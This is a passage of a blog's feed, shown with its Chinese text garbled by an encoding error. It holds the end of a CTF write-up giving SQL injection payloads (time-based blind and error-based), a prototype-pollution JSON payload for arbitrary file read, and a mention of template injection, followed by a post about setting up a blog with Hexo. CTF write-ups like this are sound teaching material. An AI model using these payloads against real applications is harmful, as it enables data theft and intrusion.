ï¼Œå°è¯•æ¨¡æ¿æ³¨å…¥ï¼Œå…ˆæ„é€  <code>2</code> å¾—åˆ°ç»“æœ <code>2</code> ï¼Œæ¨¡æ¿æ„é€ æ¼æ´å­˜åœ¨ï¼Œç›´æ¥æ„é€  <code></code> ï¼Œå³å¯å¾—åˆ°å¯†é’¥<br>é€šè¿‡ flask æ¡†æ¶æ„é€  session ï¼Œæ›¿æ¢æœ¬é¢˜ç½‘é¡µä¸­çš„ sessionï¼Œåˆ·æ–°é¡µé¢å³å¯å‘ç° flag å‡ºç°åœ¨ url ä¸­ï¼ŒæˆåŠŸè·å¾— flag</p><h2 id="normal-sql"><a href="#normal-sql" class="headerlink" title="normal_sql"></a>normal_sql</h2><hr><p>æœ¬é¢˜éªŒè¯ç å˜æˆäº†ç»™å®šå…¶md5çš„å‰å››ä½ï¼Œæ— éæ˜¯å¢åŠ äº†äº›è„šæœ¬è¡Œæ•°å’Œè¿è¡Œæ—¶é—´ï¼Œé—®é¢˜ä¸å¤§<br>ä¾æ—§è¿‡æ»¤äº†ä¼—å¤šå­—ç¬¦ï¼Œä¸”å¹¶æ— é”™è¯¯ä¿¡æ¯ï¼Œæ•…è€ƒè™‘å»¶æ—¶ç›²æ³¨ï¼Œæ„é€ å¦‚ä¸‹ payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;and(if(ascii(substr((select(...)from(...)),index,1))&gt;0,1,sleep(3)))%23</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ <code>...</code> <code>index</code> å’Œ <code>0</code> å¤„çš„å€¼ï¼Œé€šè¿‡ç½‘é¡µåŠ è½½æ—¶é—´ï¼Œåˆ¤æ–­ç›²æ³¨ç»“æœ<br>ä¾æ¬¡æŸ¥è¯¢åº“åã€è¡¨åã€å­—æ®µåï¼ŒæˆåŠŸè·å¾— flag</p><h2 id="Gay-Profile-Plus-Plus-Plus"><a href="#Gay-Profile-Plus-Plus-Plus" class="headerlink" title="Gay Profile Plus Plus Plus"></a>Gay Profile Plus Plus Plus</h2><hr><p>emmmâ€¦tsåç«¯å¯è¿˜è¡Œ<br>æºç æä¾›äº†é‚£å°±ç›´æ¥åº·åº·ï¼Œå‘ç°åœ¨ <code>/file</code> ä¸­æœ‰ä»¥ä¸‹å†…å®¹</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!file &amp;&amp; !ctx.__proto__.name) &#123;</span><br><span class="line">        ctx.body = <span class="string">'No No No...'</span>;</span><br><span class="line">        ctx.status = <span class="number">422</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (file &amp;&amp; file.indexOf(<span class="string">'flag'</span>) !== <span class="number">-1</span>)&#123;</span><br><span class="line">        ctx.body = <span class="string">'No No No...'</span>;</span><br><span class="line">        ctx.status = <span class="number">403</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!file)&#123;</span><br><span class="line">        file = ctx.__proto__.name;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¤§æ¦‚ä¸€çœ‹æˆ‘ä»¬å°±ä¼šå‘ç°ï¼Œflag åº”è¯¥æ˜¯æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œè€Œä½ ä¸èƒ½é€šè¿‡è¿™ä¸ªæ–‡ä»¶åè¯»å–å®ƒï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ <code>ctx.__proto__.name</code> ç»§æ‰¿ <code>name</code> å±æ€§ï¼Œæ‰€ä»¥è€ƒè™‘åŸå‹é“¾æ±¡æŸ“<br>å†çœ‹ <code>/save</code> çš„éƒ¨åˆ†ï¼Œå¯ä»¥å‘ç°è¾“å…¥æ•°æ®ä¼šé€šè¿‡ <code>JSON.parse</code> è§£æï¼Œè¿™æ ·å°±ä¸ºæˆ‘ä»¬è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“æä¾›äº†å¯èƒ½ï¼Œæ•…æ„é€ ä»¥ä¸‹ <code>JSONå­—ç¬¦ä¸²</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"type"</span>: <span class="string">"hhh"</span>, <span class="attr">"content"</span>: &#123;<span class="attr">"constructor"</span>: &#123;<span class="attr">"prototype"</span>: &#123;<span class="attr">"name"</span>: filename&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>åªéœ€ä¿®æ”¹ <code>filename</code> çš„å€¼æäº¤ï¼Œå†åœ¨ <code>/file</code> å¤„å°† <code>name</code> ç•™ç©ºï¼Œå³å¯è¯»å–ä»»æ„æ–‡ä»¶ï¼Œé¦–å…ˆå°è¯• <code>flag</code> æ— æœï¼Œå†å°è¯• <code>../flag</code> ï¼ŒæˆåŠŸè·å¾— flag</p><h2 id="hard-sql"><a href="#hard-sql" class="headerlink" title="hard_sql"></a>hard_sql</h2><hr><p>é¢˜å¹²ç›´æ¥å‘Šè¯‰æˆ‘ä»¬ <code>Make it wrong</code> ï¼Œé¦–å…ˆè€ƒè™‘çš„æ˜¯æŠ¥é”™æ³¨å…¥ï¼Œä½†æ˜¯é”™è¯¯ä¿¡æ¯æ ¹æœ¬æ²¡æœ‰å›æ˜¾ï¼Œå‡ºé”™åªä¼šæœ‰ <code>Something wrong</code> çš„æç¤º<br>è¿™é‡Œå¯ä»¥è€ƒè™‘è®©å…¶åœ¨ç‰¹å®šæƒ…å†µä¸‹æŠ¥é”™ï¼Œé¦–å…ˆè€ƒè™‘ <code>if</code> ï¼Œå‘ç°è¢«è¿‡æ»¤ï¼Œäºæ˜¯ä½¿ç”¨ <code>case when</code> çš„ç”¨æ³•<br>æ„é€ ä»¥ä¸‹ payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' and case (ascii(substr((something),index,1))) when asc then pow(999,999) <span class="keyword">end</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ³¨æ„ <code>select</code> å’Œ <code>information</code> ä¼šè¢«è¿‡æ»¤ï¼Œä½†åªéœ€é€šè¿‡å¤§å°å†™å˜åŒ–ç»•è¿‡å³å¯<br>ä¸Šè¿°è¯­å¥åœ¨æŸ¥è¯¢çš„å­—ç¬¦çš„ ascii ç­‰äºç»™å‡ºçš„æ•°å­—æ—¶ï¼Œæ‰ä¼šæ‰§è¡Œ <code>pow(999,999)</code> ï¼Œæ­¤æ—¶æ‰ä¼šäº§ç”ŸæŠ¥é”™<br>é€šè¿‡ä¿®æ”¹ <code>something</code> <code>index</code> å’Œ <code>asc</code> å¯ä»¥çˆ†å‡ºåº“åå’Œè¡¨åï¼Œä½†å½“å°è¯•çˆ†å‡ºå­—æ®µåçš„æ—¶å€™å‘ç° <code>column</code> è¢«è¿‡æ»¤ä¸”æ— æ³•ç»•è¿‡ï¼Œæ‰€ä»¥å°è¯•æ— åˆ—åæ³¨å…¥ï¼ˆè™½ç„¶æˆ‘ä¹Ÿä¸æ‡‚ä¸ºä»€ä¹ˆæ— åˆ—åæ³¨å…¥çš„é¢˜åªæœ‰ä¸€åˆ—ï¼Œä½†æ˜¯è¿˜æ˜¯è¿™ä¹ˆåšäº†ï¼‰,å°† <code>something</code> æ”¹ä¸ºå¦‚ä¸‹ payload å³å¯è¿›è¡Œæ— åˆ—åæ³¨å…¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="string">`1`</span> <span class="keyword">from</span> (<span class="keyword">Select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> database_name.table_name) <span class="keyword">as</span> a <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>ä¾æ¬¡çˆ†å‡º flag çš„æ¯ä¸€ä½å³å¯ï¼ŒæˆåŠŸè·å¾— flag</p><h2 id="BOSS-Get-Me-Inside"><a href="#BOSS-Get-Me-Inside" class="headerlink" title="[BOSS] Get Me Inside"></a>[BOSS] Get Me Inside</h2><hr><p><a href="/2019/10/24/cnss-recruit-2019-web-boss/">Get â™‚ Me â™‚ Inside</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;p&gt;ç”±äºæŠ€æœ¯æœ‰é™ï¼Œæ—¶é—´åŒ†å¿™ï¼Œæœ¬æ–‡å¯èƒ½å­˜åœ¨å„ç§é—®é¢˜ã€‚å¦‚å‘ç°é—®é¢˜ï¼ˆå¦‚æ€è·¯é”™è¯¯ã€æœ¯è¯­é”™è¯¯ æˆ– æˆ‘çš„è§£æ³•å‡­ç©ºå¢åŠ äº†è§£é¢˜éš¾åº¦ ç­‰ï¼‰ï¼Œè¯·å„ä½ dalao æ¯«ä¸çŠ¹è±«çš„é”¤çˆ†æˆ‘çš„ç‹—å¤´ï¼Œè°¢è°¢ï¼&lt;/p&gt;&lt;p&gt;æ„Ÿè°¢ &lt;strong&gt;ay3&lt;/strong&gt; å¯¹ &lt;code&gt;äº§å“
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://x5tar.com/categories/CTF/"/>
    
    
      <category term="CNSS" scheme="https://x5tar.com/tags/CNSS/"/>
    
      <category term="WriteUp" scheme="https://x5tar.com/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>åšå®¢æ­å»ºè¡€æ³ªå²</title>
    <link href="https://x5tar.com/2019/10/23/build-my-blog/"/>
    <id>https://x5tar.com/2019/10/23/build-my-blog/</id>
    <published>2019-10-23T01:24:52.000Z</published>
    <updated>2020-05-03T09:23:22.896Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>å‰å‡ å¤©å¿ƒè¡€æ¥æ½®æƒ³æ­ä¸ªåšå®¢ï¼Œå¯ä¸‡ä¸‡æ²¡æƒ³åˆ°ï¼Œæ­ä¸ªåšå®¢å¦‚æ­¤ä»¤äººæ„‰(beng)æ‚¦(kui)ï¼Œæ¥è®©æˆ‘ä»¬ä»å¤´è¯´èµ·ğŸ˜­</p><h2 id="0x01-Whereï¼Ÿ"><a href="#0x01-Whereï¼Ÿ" class="headerlink" title="0x01 Whereï¼Ÿ"></a>0x01 Whereï¼Ÿ</h2><p>æ­å»ºåšå®¢ä¸€èˆ¬æœ‰ä¸¤ç§é€‰æ‹©ï¼šGitHub Page æˆ–è€… è‡ªå·±çš„æœåŠ¡å™¨(VPS)ã€‚ç¬¬ä¸€ç§æ–¹æ³•æ“ä½œç®€å•ï¼Œè€Œä¸”<strong><em>ä¸è¦é’±</em></strong>ï¼Œä½†åªèƒ½ä½¿ç”¨é™æ€ç½‘ç«™ï¼Œå¯ä»¥æ­é… Hexo ç­‰é™æ€ç½‘ç«™ç”Ÿæˆå™¨ï¼Œ<del>ä½†æ˜¯ç”±äºä¸€äº›ç‰¹æ®Šçš„åŸå› ï¼Œè¿™é‡Œæˆ‘é‡‡ç”¨äº†ç¬¬äºŒç§æ–¹æ³•</del> Github Page çœŸé¦™ï¼ˆç”¨äº† Custom domainï¼‰ã€‚</p><p><del>VPS æœåŠ¡å•†æˆ‘é€‰æ‹©äº†è€ç‰Œå¤§å‚ Vultr ï¼Œä¸€ä¸ªä¸€ä¸ªè¯• IP å¯æ˜¯çœŸçš„å¿«â™‚ä¹ï¼ˆæ‰‹åŠ¨æ»‘ç¨½ï¼‰ï¼Œç»è¿‡æ— æ•°æ¬¡å°è¯•ï¼Œè‹å¤©ä¸è´Ÿæœ‰å¿ƒäººï¼Œç»ˆäºç»™æˆ‘ä¸ªèƒ½ç”¨çš„äº†ï¼Œç„¶å LNMP ä¸€æ¡é¾™ï¼ŒæœåŠ¡å™¨æ–¹é¢åŸºæœ¬ OKã€‚</del></p><p>ç„¶åæ˜¯åŸŸåï¼Œä¾æ—§æ˜¯ä¸ªè€ç‰Œå¤§å‚ GoDaddy ï¼Œæå®ŒåŸŸåéšæ‰‹æŒ‚åœ¨ CloudFlare ä¸Šï¼Œçˆ½æ­ªæ­ªã€‚</p><p>è‡³æ­¤ï¼Œç¬¬ä¸€ä¸ªé—®é¢˜ â€œWhere?â€ è§£å†³ã€‚</p><h2 id="0x02-Howï¼Ÿ"><a href="#0x02-Howï¼Ÿ" class="headerlink" title="0x02 Howï¼Ÿ"></a>0x02 Howï¼Ÿ</h2><p>è¯´èµ·æ€ä¹ˆå»ºç«™ï¼Œè¿™å¯çœŸçš„æ˜¯<strong>è¡€æ³ªå²</strong>çš„æ¥å†ã€‚</p><p>æ­å»ºåšå®¢ä¸€èˆ¬åˆæœ‰ä¸¤ç§é€‰æ‹©ï¼š<strong>åŠ¨æ€ç½‘ç«™</strong> å’Œ <strong>é™æ€ç½‘ç«™</strong>ã€‚å½“ç„¶åˆç”±äºå¯¹æŠ€æœ¯çš„å‘å¾€ï¼ˆè¿™æ¬¡æ˜¯çœŸçš„å‘å¾€ï¼‰ï¼Œåæ‰‹å°±æ˜¯ä¸€ä¸ª Wordpress <del>ï¼ˆå®‰è£…æå…¶å®¹æ˜“ï¼Œè½»æ¾å¼€å§‹ Blog ç”Ÿæ´»ï¼‰</del>ã€‚</p><p>å¥½äº†è£…æ˜¯è£…å®Œäº†ï¼Œå«Œé…ç½®éº»çƒ¦å¯èƒ½æ˜¯å› ä¸ºæˆ‘å¤ªèœäº†ï¼Œ<strong>ä½†æ˜¯</strong>ï¼Œä½ å®˜æ–¹ä¸»é¢˜è¿˜èƒ½å†ä¸‘ä¸€ç‚¹å—ï¼Œä½ è¯´å¥½çš„åšå®¢å¹³å°ä½ ä¸ºå•¥ä¸»é¢˜åƒå¥‡ç™¾æ€ªï¼ˆæ­¤å¤„çœç•¥ä¸€ä¸‡å­—åæ§½ï¼‰ï¼Œç”±äºæœ¬äººè¿‡èœä¸æƒ³è‡ªå·±é…ç½®å¤ªå¤šåªèƒ½é åæ§½ä¸ºç”Ÿï¼Œ<del>å¤§ä½¬å‹¿å–·</del>åæ­£ä¹Ÿä¸ä¼šæœ‰å¤§ä½¬çœ‹çš„å§ã€‚å¥½å§é‚£æ—¢ç„¶å®˜æ–¹ä¸»é¢˜æ»¡â™‚è¶³ä¸äº†æˆ‘æˆ‘å°±æ‰¾ç¬¬ä¸‰æ–¹å‘—ï¼Œ<strong>ä½†æ˜¯</strong>ï¼Œå¥½åº·çš„æ˜¯æœ‰å•Šï¼Œä½†æ˜¯éƒ½è¦é’±å•Šï¼ˆæ­¤å¤„ç•™ä¸‹è´«ç©·çš„æ³ªæ°´ï¼‰ã€‚å¥½å§ï¼Œæ½‡æ´’è½¬èº«ï¼Œç¼“ç¼“æ‰“å‡º <code>rm -rf ./*</code> ï¼Œæ‹œæ‹œäº†æ‚¨å˜ã€‚</p><p>äºæ˜¯è½¬å‘é™æ€ç½‘ç«™å¯»æ±‚è§£å†³ï¼Œå—¯ï¼ŒçœŸé¦™ã€‚è¯´åˆ°é™æ€ç½‘ç«™å°±è¦æåˆ°è¿™ä¸‰å®¶ï¼šJekyll, Hugo å’Œ Hexoã€‚è¿™é‡Œæˆ‘é€‰æ‹©äº†é…ç½®ç®€å•ï¼Œä½†å¹¶æœªæ”¹å˜æˆ‘å¯¹æŠ€æœ¯çš„å‘å¾€ï¼ˆæ‰‹åŠ¨ç‹—å¤´ï¼‰ï¼Œä¸”ç”Ÿæˆé€Ÿåº¦å¿«çš„ <del>Hugo</del> ï¼ˆæœ€ç»ˆç”±äºä¸æ˜åŸå› å˜æˆäº† Hexoï¼‰ã€‚</p><p><del>é…ç½®æ–¹é¢å˜›ï¼Œæ‰“å¼€ GitHub ï¼Œæœç´¢ Hugo ï¼Œä¸‹è½½å¯¹åº”ç³»ç»Ÿçš„ Release ç‰ˆæœ¬ï¼Œé…ç½®å®Œæˆã€‚è¿™é‡Œä¸å¾—ä¸ç‚¹åè¡¨æ‰¬ä¸€ä¸‹ Hugo çš„å®˜æ–¹æ–‡æ¡£ï¼ŒçœŸçš„æ˜¯åº”æœ‰å°½æœ‰äº†ï¼Œç„¶åå†ç‚¹åè¡¨æ‰¬ä¸€ä¸‹å®˜æ–¹æ”¶å½•çš„ä¸»é¢˜ï¼Œ</del>è·Ÿéš”å£<del>ç®—äº†é¢å‘çš„ç¾¤ä½“ä¸åŒä¸è¯´äº†ã€‚åœ¨æˆ‘ç©¶æå®¡ç¾çš„æŒ‡å¼•ä¸‹ï¼Œæˆ‘é€‰æ‹©äº†è¿™æ¬¾åå‘æç®€é£æ ¼çš„ <code>Coder</code> ä¸»é¢˜ï¼Œè‡ªå·±çœ‹ç€èˆ’æœå°±å¥½äº†ã€‚</del></p><p><del>ä» GitHub ä¸Š clone ä¸€ä¸‹ä¸»é¢˜ï¼Œç®€å•é…ç½®ä¸€ä¸‹ï¼Œå°±å¯ä»¥æŠ•å…¥ä½¿ç”¨äº†ã€‚</del></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm install hexo-cli -g</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œç¬¬äºŒä¸ªé—®é¢˜ â€œHow?â€ ä¹Ÿè§£å†³äº†ã€‚</p><h2 id="0x03-ä½¿ç”¨-HTTPS"><a href="#0x03-ä½¿ç”¨-HTTPS" class="headerlink" title="0x03 ä½¿ç”¨ HTTPS"></a>0x03 ä½¿ç”¨ HTTPS</h2><p>è¿™é‡Œæˆ‘ä½¿ç”¨äº†ä¸€ä¸ª<strong>æå…¶è‰ç‡</strong>çš„æ–¹æ³•ï¼Œç›´æ¥ä½¿ç”¨äº† CloudFlare çš„ <code>Flexible</code> æ¨¡å¼ï¼Œç„¶åå† <code>Page Rule</code> é‡Œé…ç½®ä¸€ä¸‹å¼ºåˆ¶ä½¿ç”¨ HTTPS å³å¯ã€‚</p><h2 id="0x04-æ€»ç»“"><a href="#0x04-æ€»ç»“" class="headerlink" title="0x04 æ€»ç»“"></a>0x04 æ€»ç»“</h2><p>æ­å»ºåšå®¢å¹¶éä¸€ä¸ªç®€å•çš„äº‹ï¼Œè€ŒåŒä¸€ç§æ–¹æ³•ä¹Ÿä¸ä¸€å®šé€‚åˆæ‰€æœ‰äººï¼Œåªæœ‰ç»è¿‡è‡ªå·±çš„å°è¯•å‘ç°çœŸæ­£é€‚åˆè‡ªå·±çš„æ–¹æ³•ï¼Œæ‰èƒ½æ­å»ºå‡ºçœŸæ­£å±äºè‡ªå·±çš„åšå®¢ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h2&gt;&lt;p&gt;å‰å‡ å¤©å¿ƒè¡€æ¥æ½®æƒ³æ­ä¸ªåšå®¢ï¼Œå¯ä¸‡ä¸‡æ²¡æƒ³åˆ°ï¼Œæ­ä¸ªåšå®¢å¦‚æ­¤ä»¤äººæ„‰(beng)æ‚¦(kui)ï¼Œæ¥è®©æˆ‘ä»¬ä»å¤´è¯´èµ·
      
    
    </summary>
    
    
      <category term="å¿ƒè·¯å†ç¨‹" scheme="https://x5tar.com/categories/%E5%BF%83%E8%B7%AF%E5%8E%86%E7%A8%8B/"/>
    
    
      <category term="Blog" scheme="https://x5tar.com/tags/Blog/"/>
    
  </entry>
  
</feed>
